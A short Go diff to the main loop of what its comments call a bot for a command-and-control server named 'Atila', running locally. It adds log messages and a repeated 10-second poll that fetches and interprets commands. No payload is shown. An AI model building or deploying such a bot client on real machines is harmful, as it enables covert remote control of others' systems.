@@ -1,6 +1,7 @@
 package main
 
 import (
+	"fmt"
 	"time"
 
 	"github.com/google/uuid"
@@ -19,12 +20,21 @@ var atilaHost string = "http://localhost:60666"
 func main() {
 	// Make yourself known to the Atila. (cnc)
 	for range time.Tick(time.Second * 5) {
+		fmt.Println("Bot is trying to identify to the back-end.")
 		identified := identify(id.String(), publicIdentificationKey)
 		if identified {
+			fmt.Println("Bot has been identified successfuly.")
 			break
 		}
 	}
 
-	// Fetch and interpret messages, then issue responses.
-	inboxReader()
+	for range time.Tick(time.Second * 10) {
+		// Fetch and interpret messages, then issue responses.
+		readerStatus := inboxReader(id.String())
+		if readerStatus {
+			fmt.Println("Successfully interpreted messages.")
+		} else {
+			fmt.Println("Failed to interpret messages.")
+		}
+	}
 }
